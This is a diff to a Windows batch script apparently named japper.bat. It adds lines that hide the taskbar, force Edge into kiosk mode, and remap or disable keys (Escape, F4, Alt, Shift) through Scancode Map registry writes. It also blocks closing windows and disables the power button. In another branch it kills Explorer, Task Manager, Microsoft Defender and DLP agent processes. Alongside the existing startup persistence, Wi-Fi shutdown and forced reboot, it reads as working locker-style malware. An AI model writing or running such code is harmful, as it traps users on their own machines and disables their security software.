@@ -43,13 +43,35 @@ if %errorlevel% == 0 (
     Set-PolicyFileEntry -Path $UserDir -Key $RegPath -ValueName $RegName -Data $RegData -Type $RegType
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideRestart" -Name "value" -Value 1
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideShutDown" -Name "value" -Value 1
+    powershell -command "& {Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3' -Name Settings -Value ((Get-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3').Settings[0..7] + 3 + (Get-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3').Settings[9..-1]); Stop-Process -f -ProcessName explorer}"
+    start msedge --kiosk https://example.com
+    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v Scancode Map /t REG_BINARY /d 0000000000000000030000005BE03A0000000000 /f
+    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 000000000000000003000000380000000038E0000000000000 /f
+    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 0000000000000000020000003E00000000000000 /f
+    powershell -command "Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layout' -Name 'Scancode Map' -Value ([byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x2A,0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x00,0x00))"
+    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 0000000000000000020000000100000000000000 /f
+    REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f
+    powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_BUTTONS SBUTTONACTION 0
+    powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_BUTTONS SBUTTONACTION 0
+    powercfg /SETACTIVE SCHEME_CURRENT
     netsh interface set interface "Wi-Fi" admin=disabled
     for /f "usebackq tokens=*" %%i in (`powershell -command "[Environment]::GetFolderPath('CommonStartup')"`) do set startupPath=%%i
     cd /d "%startupPath%"
     echo start "" "%~dp0japper.bat">japperstarter.bat
+    endlocal
     popd
     shutdown /r
 ) else (
+    TASKKILL /IM Explorer.exe
+    TASKKILL /IM OneDrive.exe
+    TASKKILL /IM OneDrive.App.exe
+    TASKKILL /IM Taskmgr.exe
+    TASKKILL /IM MpDefenderCoreService.exe
+    TASKKILL /IM MipDlp.exe
+    TASKKILL /IM DlpUserAgent.exe
+    TASKKILL /IM DlpUserAgent.exe
+    TASKKILL /IM mpextms.exe
+    TASKKILL /F /IM cmd.exe /T
     start "" "%~dp0japper_killer.bat"
-    
+    endlocal
 )
